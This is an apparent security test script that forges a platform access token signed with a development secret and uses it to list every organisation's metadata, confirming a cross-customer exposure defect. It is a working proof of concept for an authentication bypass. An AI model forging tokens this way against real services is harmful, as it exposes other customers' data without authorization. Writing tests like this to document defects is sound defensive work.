async def main() -> None:
    print("== TC-PC-025 — FORGED platform token lists ALL orgs' metadata (cross-customer exposure) ==")
    async with _client() as c:
        forged = forge_platform_token()  # random sub, aud='platform', DEV_SECRET
        print("[forge]   forged platform token w/ random sub on DEV_SECRET")

        listing = await c.get("/platform/orgs", headers=bearer(forged))
        print("[attack]  GET /platform/orgs (FORGED platform token):", listing.status_code)
        rows = listing.json()
        if listing.status_code != 200 or not isinstance(rows, list):
            print("          body:", rows)
            print("RESULT: FAIL — expected 200 list, got", listing.status_code)
            return

        slugs = [r.get("slug") for r in rows]
        fields = sorted(rows[0].keys()) if rows else []
        # Exposure proof: orgs THIS run did not create are visible to a forged token.
        # The seeded demo orgs (demo/globex) are guaranteed foreign to this suite.
        foreign = [s for s in slugs if not (s or "").startswith("xdom-")]
        print("          count =", len(rows), "fields =", fields)
        print("          sample slugs (foreign to this run) =", foreign[:10])
        print("          field-shape EXACTLY metadata?",
              fields == ["created_at", "id", "name", "slug", "status", "user_count"])

        exposed = len(foreign) > 0
        ok = listing.status_code == 200 and exposed
        print("RESULT:", f"PASS (DEFECT-AS-DESIGNED) — forged token saw {len(foreign)} foreign orgs' metadata"
              if ok else "FAIL — forged token did not expose foreign org metadata")


asyncio.run(main())
